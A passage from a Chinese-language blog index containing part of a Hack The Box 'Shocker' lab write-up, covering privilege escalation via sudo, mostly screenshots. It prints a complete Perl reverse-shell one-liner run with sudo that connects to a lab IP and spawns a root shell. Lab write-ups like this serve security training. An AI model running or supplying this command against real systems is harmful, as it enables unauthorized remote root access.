-<img src="/2021/02/03/HTB-Shocker/5.png" class>
-
-<h4 id="sudo-l-看下"><a href="#sudo-l-看下" class="headerlink" title="sudo -l 看下"></a>sudo -l 看下</h4><img src="/2021/02/03/HTB-Shocker/6.png" class>
-
-<h4 id="sudo-perl-反连"><a href="#sudo-perl-反连" class="headerlink" title="sudo  perl  反连"></a>sudo  perl  反连</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo perl -e <span class="string">&#x27;use Socket;$i=&quot;10.10.14.33&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2021/02/03/HTB-Shocker/7.png" class>
-
-<img src="/2021/02/03/HTB-Shocker/8.png" class>
-
-<p>OR</p>
-<img src="/2021/02/03/HTB-Shocker/9.png" class>
-
-<img src="/2021/02/03/HTB-Shocker/10.png" class>]]></content>
-      <categories>
-        <category>安全实验</category>
       </categories>
   </entry>
 </search>
